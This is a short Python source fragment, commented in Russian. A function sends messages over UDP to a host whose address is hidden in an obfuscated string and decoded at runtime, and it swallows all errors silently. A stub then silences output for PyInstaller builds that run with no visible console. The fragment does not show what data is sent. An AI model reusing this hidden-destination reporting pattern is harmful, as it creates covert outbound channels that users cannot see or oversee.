def log_to_bot(msg):
    try:
        if "--udp" in sys.argv:
            port = int(sys.argv[sys.argv.index("--udp") + 1])
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(msg.encode("utf-8"), (decrypt_string("XwBPRX5/aUxr"), port))
            sock.close()
    except Exception:
        pass

# Фикс для PyInstaller --noconsole: при скрытой консоли stdout и stderr отсутствуют (= None). 
# Любая функция, пытающаяся писать в них (даже библиотеки вроде pywebview), крашит скрипт.
class NullWriter:
    def write(self, text): pass
    def flush(self): pass

if sys.stdout is None:
    sys.stdout = NullWriter()
if sys.stderr is None:
    sys.stderr = NullWriter()

